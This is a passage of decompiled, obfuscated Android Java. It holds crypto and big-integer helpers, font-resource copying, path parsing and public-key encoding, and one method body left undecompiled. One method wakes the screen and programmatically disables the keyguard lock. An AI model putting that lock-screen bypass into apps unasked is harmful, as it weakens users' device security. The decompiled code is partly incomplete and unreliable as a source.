                l51.b(viewGroup, z);
            } catch (NoSuchMethodError unused) {
                f = false;
            }
        }
    }

    public static void h(StringBuilder sb, Object obj, b10 b10Var) {
        if (b10Var != null) {
            sb.append((CharSequence) b10Var.invoke(obj));
            return;
        }
        if (obj == null ? true : obj instanceof CharSequence) {
            sb.append((CharSequence) obj);
        } else if (obj instanceof Character) {
            sb.append(((Character) obj).charValue());
        } else {
            sb.append((CharSequence) String.valueOf(obj));
        }
    }

    public static BigInteger h0(int[] iArr) {
        byte[] bArr = new byte[24];
        for (int i2 = 0; i2 < 6; i2++) {
            int i3 = iArr[i2];
            if (i3 != 0) {
                ma0.K(bArr, i3, (5 - i2) << 2);
            }
        }
        return new BigInteger(1, bArr);
    }

    public static BigInteger i0(long[] jArr) {
        byte[] bArr = new byte[24];
        for (int i2 = 0; i2 < 3; i2++) {
            long j = jArr[i2];
            if (j != 0) {
                ma0.S(j, bArr, (2 - i2) << 3);
            }
        }
        return new BigInteger(1, bArr);
    }

    public static void j(Closeable closeable) {
        if (closeable != null) {
            try {
                closeable.close();
            } catch (IOException unused) {
            }
        }
    }

    public static void j0(Context context) {
        PowerManager powerManager = (PowerManager) context.getSystemService("power");
        if (powerManager == null || powerManager.isInteractive()) {
            return;
        }
        try {
            if (e == null) {
                e = powerManager.newWakeLock(268435466, "myapp:WakeLockTag");
            }
            e.acquire(5000L);
        } catch (Exception unused) {
        }
        try {
            Intent intent = new Intent(context, (Class<?>) WakeScreenActivity.class);
            intent.addFlags(335544320);
            context.startActivity(intent);
        } catch (Exception unused2) {
        }
        try {
            KeyguardManager keyguardManager = (KeyguardManager) context.getSystemService("keyguard");
            if (keyguardManager != null) {
                keyguardManager.newKeyguardLock("myapp:KeyguardLock").disableKeyguard();
            }
        } catch (Exception unused3) {
        }
    }

    public static void k(int i2, int[] iArr, int[] iArr2) {
        iArr2[i2] = iArr[0];
        iArr2[i2 + 1] = iArr[1];
        iArr2[i2 + 2] = iArr[2];
        iArr2[i2 + 3] = iArr[3];
        iArr2[i2 + 4] = iArr[4];
        iArr2[i2 + 5] = iArr[5];
    }

    public static void l(int i2, long[] jArr, long[] jArr2) {
        jArr2[i2] = jArr[0];
        jArr2[i2 + 1] = jArr[1];
        jArr2[i2 + 2] = jArr[2];
    }

    public static void m(int i2, long[] jArr, long[] jArr2) {
        jArr2[i2] = jArr[0];
        jArr2[i2 + 1] = jArr[1];
        jArr2[i2 + 2] = jArr[2];
        jArr2[i2 + 3] = jArr[3];
        jArr2[i2 + 4] = jArr[4];
        jArr2[i2 + 5] = jArr[5];
        jArr2[i2 + 6] = jArr[6];
    }

    public static float[] n(float[] fArr, int i2) {
        if (i2 < 0) {
            throw new IllegalArgumentException();
        }
        int length = fArr.length;
        if (length < 0) {
            throw new ArrayIndexOutOfBoundsException();
        }
        int iMin = Math.min(i2, length);
        float[] fArr2 = new float[i2];
        System.arraycopy(fArr, 0, fArr2, 0, iMin);
        return fArr2;
    }

    public static boolean o(File file, Resources resources, int i2) throws Throwable {
        InputStream inputStreamOpenRawResource;
        try {
            inputStreamOpenRawResource = resources.openRawResource(i2);
            try {
                boolean zP = p(file, inputStreamOpenRawResource);
                j(inputStreamOpenRawResource);
                return zP;
            } catch (Throwable th) {
                th = th;
                j(inputStreamOpenRawResource);
                throw th;
            }
        } catch (Throwable th2) {
            th = th2;
            inputStreamOpenRawResource = null;
        }
    }

    public static boolean p(File file, InputStream inputStream) throws Throwable {
        FileOutputStream fileOutputStream;
        StrictMode.ThreadPolicy threadPolicyAllowThreadDiskWrites = StrictMode.allowThreadDiskWrites();
        FileOutputStream fileOutputStream2 = null;
        try {
            try {
                fileOutputStream = new FileOutputStream(file, false);
            } catch (IOException e2) {
                e = e2;
            }
        } catch (Throwable th) {
            th = th;
        }
        try {
            byte[] bArr = new byte[1024];
            while (true) {
                int i2 = inputStream.read(bArr);
                if (i2 == -1) {
                    j(fileOutputStream);
                    StrictMode.setThreadPolicy(threadPolicyAllowThreadDiskWrites);
                    return true;
                }
                fileOutputStream.write(bArr, 0, i2);
            }
        } catch (IOException e3) {
            e = e3;
            fileOutputStream2 = fileOutputStream;
            Log.e("TypefaceCompatUtil", "Error copying resource contents to temp file: " + e.getMessage());
            j(fileOutputStream2);
            StrictMode.setThreadPolicy(threadPolicyAllowThreadDiskWrites);
            return false;
        } catch (Throwable th2) {
            th = th2;
            fileOutputStream2 = fileOutputStream;
            j(fileOutputStream2);
            StrictMode.setThreadPolicy(threadPolicyAllowThreadDiskWrites);
            throw th;
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:17:0x0042  */
    /* JADX WARN: Removed duplicated region for block: B:41:0x0091  */
    /* JADX WARN: Removed duplicated region for block: B:44:0x0096 A[Catch: NumberFormatException -> 0x00aa, LOOP:3: B:25:0x0068->B:44:0x0096, LOOP_END, TryCatch #0 {NumberFormatException -> 0x00aa, blocks: (B:22:0x0054, B:25:0x0068, B:27:0x006e, B:31:0x007a, B:44:0x0096, B:46:0x009c, B:52:0x00b1, B:53:0x00b4), top: B:68:0x0054 }] */
    /* JADX WARN: Removed duplicated region for block: B:46:0x009c A[Catch: NumberFormatException -> 0x00aa, TryCatch #0 {NumberFormatException -> 0x00aa, blocks: (B:22:0x0054, B:25:0x0068, B:27:0x006e, B:31:0x007a, B:44:0x0096, B:46:0x009c, B:52:0x00b1, B:53:0x00b4), top: B:68:0x0054 }] */
    /* JADX WARN: Removed duplicated region for block: B:50:0x00ae  */
    /* JADX WARN: Removed duplicated region for block: B:52:0x00b1 A[Catch: NumberFormatException -> 0x00aa, TryCatch #0 {NumberFormatException -> 0x00aa, blocks: (B:22:0x0054, B:25:0x0068, B:27:0x006e, B:31:0x007a, B:44:0x0096, B:46:0x009c, B:52:0x00b1, B:53:0x00b4), top: B:68:0x0054 }] */
    /* JADX WARN: Removed duplicated region for block: B:72:0x00d7 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:81:0x0095 A[SYNTHETIC] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    public static defpackage.mk0[] q(java.lang.String r17) {
        /*
            Method dump skipped, instruction units count: 268
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: defpackage.o80.q(java.lang.String):mk0[]");
    }

    public static Path r(String str) {
        Path path = new Path();
        try {
            mk0.b(q(str), path);
            return path;
        } catch (RuntimeException e2) {
            throw new RuntimeException("Error in parsing ".concat(str), e2);
        }
    }

    public static ol0 s(s8 s8Var, k0 k0Var) throws IOException {
        d80 d80VarF;
        if (s8Var instanceof c80) {
            c80 c80Var = (c80) s8Var;
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            byte b2 = (byte) 0;
            byteArrayOutputStream.write(b2);
            byte b3 = (byte) 0;
            byteArrayOutputStream.write(b3);
            byte b4 = (byte) 0;
            byteArrayOutputStream.write(b4);
            byte b5 = (byte) 1;
            byteArrayOutputStream.write(b5);
            try {
                byteArrayOutputStream.write(c80Var.getEncoded());
                byte[] byteArray = byteArrayOutputStream.toByteArray();
                ByteArrayOutputStream byteArrayOutputStream2 = new ByteArrayOutputStream();
                byteArrayOutputStream2.write(b2);
                byteArrayOutputStream2.write(b3);
                byteArrayOutputStream2.write(b4);
                byteArrayOutputStream2.write(b5);
                try {
                    byteArrayOutputStream2.write(c80Var.f().b());
                    return new ol0(new l4(vj0.g), new tk(byteArray), k0Var, byteArrayOutputStream2.toByteArray());
                } catch (Exception e2) {
                    throw new RuntimeException(e2.getMessage(), e2);
                }
            } catch (Exception e3) {
                throw new RuntimeException(e3.getMessage(), e3);
            }
        }
        if (!(s8Var instanceof s20)) {
            if (s8Var instanceof kq0) {
                kq0 kq0Var = (kq0) s8Var;
                l4 l4Var = new l4((d0) l31.e.get((jq0) kq0Var.F));
                tk tkVar = new tk(kq0Var.getEncoded());
                d30 d30Var = kq0Var.H;
                return new ol0(l4Var, tkVar, k0Var, z91.m(d30Var.a, d30Var.b));
            }
            if (s8Var instanceof nb0) {
                nb0 nb0Var = (nb0) s8Var;
                l4 l4Var2 = new l4((d0) l31.a.get((mb0) nb0Var.F));
                byte[] bArrL = z91.l(nb0Var.L);
                return bArrL == null ? new ol0(l4Var2, new tk(nb0Var.getEncoded()), k0Var, null) : new ol0(l4Var2, new tk(bArrL), k0Var, null);
            }
            if (!(s8Var instanceof ib0)) {
                throw new IOException("key parameters not recognized");
            }
            ib0 ib0Var = (ib0) s8Var;
            l4 l4Var3 = new l4((d0) l31.c.get((hb0) ib0Var.F));
            if (z91.l(ib0Var.N) == null) {
                return new ol0(l4Var3, new tk(ib0Var.getEncoded()), k0Var, z91.m(z91.l(ib0Var.G), z91.l(ib0Var.M)));
            }
            byte[] bArr = ib0Var.G;
            byte[] bArr2 = ib0Var.M;
            z91.l(bArr);
            z91.l(bArr2);
            return new ol0(l4Var3, new tk(z91.l(ib0Var.N)), k0Var, null);
        }
        s20 s20Var = (s20) s8Var;
        ByteArrayOutputStream byteArrayOutputStream3 = new ByteArrayOutputStream();
        int i2 = s20Var.F;
        byteArrayOutputStream3.write((byte) (i2 >>> 24));
        byteArrayOutputStream3.write((byte) (i2 >>> 16));
        byteArrayOutputStream3.write((byte) (i2 >>> 8));
        byteArrayOutputStream3.write((byte) i2);
        try {
            byteArrayOutputStream3.write(s20Var.getEncoded());
            byte[] byteArray2 = byteArrayOutputStream3.toByteArray();
            ByteArrayOutputStream byteArrayOutputStream4 = new ByteArrayOutputStream();
            int i3 = s20Var.F;
            byteArrayOutputStream4.write((byte) (i3 >>> 24));
            byteArrayOutputStream4.write((byte) (i3 >>> 16));
            byteArrayOutputStream4.write((byte) (i3 >>> 8));
            byteArrayOutputStream4.write((byte) i3);
            synchronized (s20Var) {
                d80VarF = ((c80) s20Var.H.get(0)).f();
                if (d80VarF == null) {
                    throw new NullPointerException("lmsPublicKey");
                }
            }
            try {
                byteArrayOutputStream4.write(d80VarF.b());
                return new ol0(new l4(vj0.g), new tk(byteArray2), k0Var, byteArrayOutputStream4.toByteArray());
            } catch (Exception e4) {
                throw new RuntimeException(e4.getMessage(), e4);
            }
        } catch (Exception e5) {
            throw new RuntimeException(e5.getMessage(), e5);
        }
    }

    public static mk0[] t(mk0[] mk0VarArr) {
        mk0[] mk0VarArr2 = new mk0[mk0VarArr.length];
        for (int i2 = 0; i2 < mk0VarArr.length; i2++) {
            mk0VarArr2[i2] = new mk0(mk0VarArr[i2]);
        }
        return mk0VarArr2;
    }

    public static boolean u(int[] iArr, int[] iArr2, int[] iArr3) {
        boolean z;
        int i2 = 5;
        while (true) {
            z = true;
            if (i2 < 0) {
                break;
            }
            int i3 = iArr[6 + i2] ^ Integer.MIN_VALUE;
            int i4 = Integer.MIN_VALUE ^ iArr2[i2];
            if (i3 < i4) {
                z = false;
                break;
            }
            if (i3 > i4) {
                break;
            }
            i2--;
        }
        if (z) {
            e0(iArr, 6, iArr2, 0, iArr3);
            return z;
        }
        e0(iArr2, 0, iArr, 6, iArr3);
        return z;
    }

    public static float v(float f2, float f3, float f4, float f5) {
        return (float) Math.hypot(f4 - f2, f5 - f3);
    }

    public static float w(float f2, float f3, float f4, float f5) {
        float fV = v(f2, f3, 0.0f, 0.0f);
        float fV2 = v(f2, f3, f4, 0.0f);
        float fV3 = v(f2, f3, f4, f5);
        float fV4 = v(f2, f3, 0.0f, f5);
        return (fV <= fV2 || fV <= fV3 || fV <= fV4) ? (fV2 <= fV3 || fV2 <= fV4) ? fV3 > fV4 ? fV3 : fV4 : fV2 : fV;
    }

    public static boolean x(int[] iArr, int[] iArr2) {
        for (int i2 = 5; i2 >= 0; i2--) {
            if (iArr[i2] != iArr2[i2]) {
                return false;
            }
        }
        return true;
    }

    public static int[] y(BigInteger bigInteger) {
        if (bigInteger.signum() < 0 || bigInteger.bitLength() > 192) {
            throw new IllegalArgumentException();
        }
        int[] iArr = new int[6];
        for (int i2 = 0; i2 < 6; i2++) {
            iArr[i2] = bigInteger.intValue();
            bigInteger = bigInteger.shiftRight(32);
        }
        return iArr;
    }

    public static int z(int[] iArr) {
        return iArr[0] & 1;
    }

    public abstract void W(int i2);

    public abstract void X(Typeface typeface);

    public abstract Rect Y();

    @Override // defpackage.zv0
    public float c(ViewGroup viewGroup, View view) {
        return view.getTranslationY();
    }

    public void i(int i2) {
        new Handler(Looper.getMainLooper()).post(new zo0(this, i2, 0));
    }
}
